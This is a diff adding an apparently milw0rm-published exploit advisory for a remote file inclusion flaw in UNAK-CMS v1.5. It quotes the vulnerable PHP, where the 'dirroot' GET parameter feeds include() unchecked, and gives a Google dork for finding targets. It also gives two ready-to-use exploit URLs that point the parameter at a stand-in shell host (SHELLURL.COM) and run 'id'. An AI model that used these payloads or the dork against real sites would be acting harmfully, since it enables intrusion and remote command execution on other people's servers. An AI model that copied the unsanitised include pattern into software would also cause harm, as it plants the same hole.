@@ -1,0 +1,47 @@
+#==============================================================================================
+#UNAK-CMS <= v1.5 (dirroot) Remote File Inclusion Exploit
+#===============================================================================================
+#                                                                      
+#Critical Level : Dangerous                                            
+#                                                                      
+#Venedor site : http://www.unak.net      
+#                                                                      
+#Version : v1.5                                            
+#                                                        
+#================================================================================================
+#
+#Dork : "Powered by UNAK-CMS"
+#
+#================================================================================================
+#Bug in : fckeditor/editor/dialog/fck_link.php
+#
+#Vlu Code :
+#--------------------------------
+#      <?php //UNAK-CMS adaptation atanas@unak.net
+#       error_reporting(E_ERROR | E_WARNING | E_PARSE);
+#       $cf["unak"]["root"]=$_GET["dirroot"];
+#       $u_a=$_GET["u_a"];
+#       $sl=$_GET["sl"];
+#       $u_url=str_replace("http://","",$_GET["u_url"]);
+#       $u_url=str_replace("https://","",$u_url);
+#       include($cf["unak"]["root"]."/cfg/config.php");
+#       include($cf["unak"]["root"]."/engine/sessions.php");
+#       $sid=$_GET["sid"];
+#       is_valid();
+#       ?>
+#================================================================================================
+#
+#Exploit :
+#--------------------------------
+#
+#http://sitename.com/[Script Path]/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php?Dirroot=http://SHELLURL.COM?&cmd=id
+#http://sitename.com/[Script Path]/fckeditor/editor/dialog/fck_link.php?dirroot=http://SHELLURL.COM?&cmd=id
+#================================================================================================
+#Discoverd By : SHiKaA
+#
+#Conatact : SHiKaA-[at]hotmail.com
+#
+# Special Thx To : Str0ke & simoo & XoRoN & Saudi Hackerz
+==================================================================================================
+
+# milw0rm.com [2006-09-16]
